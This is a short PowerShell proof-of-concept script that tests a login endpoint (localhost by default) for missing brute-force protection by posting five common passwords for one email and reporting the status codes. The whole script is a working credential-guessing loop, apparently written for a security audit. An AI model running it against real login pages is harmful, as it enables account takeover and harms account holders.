# PoC: HIGH - Brute-force/credential stuffing against login endpoint.
# Usage:
#   powershell -ExecutionPolicy Bypass -File .\poc\high_bruteforce_login.ps1
# Optional env:
#   $env:TARGET_URL="http://localhost:3000"
#   $env:TARGET_EMAIL="target@example.com"

$targetUrl = if ($env:TARGET_URL) { $env:TARGET_URL } else { "http://localhost:3000" }
$targetEmail = if ($env:TARGET_EMAIL) { $env:TARGET_EMAIL } else { "target@example.com" }

$passwords = @(
  "password123",
  "qwerty123",
  "welcome1",
  "letmein123",
  "P@ssw0rd!"
)

Write-Host "[*] Starting brute-force simulation against $targetUrl/login for $targetEmail"

foreach ($pwd in $passwords) {
  $body = @{
    email = $targetEmail
    password = $pwd
  } | ConvertTo-Json

  try {
    $response = Invoke-WebRequest -Uri "$targetUrl/login" -Method Post -ContentType "application/json" -Body $body -TimeoutSec 10
    Write-Host "[+] Password tried: $pwd | HTTP $($response.StatusCode)"
  } catch {
    $status = $_.Exception.Response.StatusCode.value__
    if (-not $status) { $status = "N/A" }
    Write-Host "[-] Password tried: $pwd | HTTP $status"
  }
}

Write-Host "[*] If no 429 throttling/lockout occurred, brute-force controls are likely missing."
